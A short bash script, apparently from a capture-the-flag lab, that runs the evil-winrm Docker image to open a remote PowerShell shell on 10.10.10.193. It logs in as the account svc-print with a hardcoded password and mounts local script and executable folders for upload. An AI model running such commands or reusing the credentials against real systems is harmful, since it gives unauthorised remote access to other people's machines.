#!/bin/bash
sudo docker run -it --name evil-winrm -v $PWD:/ps1_scripts -v $PWD:/exe_files -v $PWD:/data oscarakaelvis/evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1' -s '/ps1_scripts/' -e '/exe_files/'
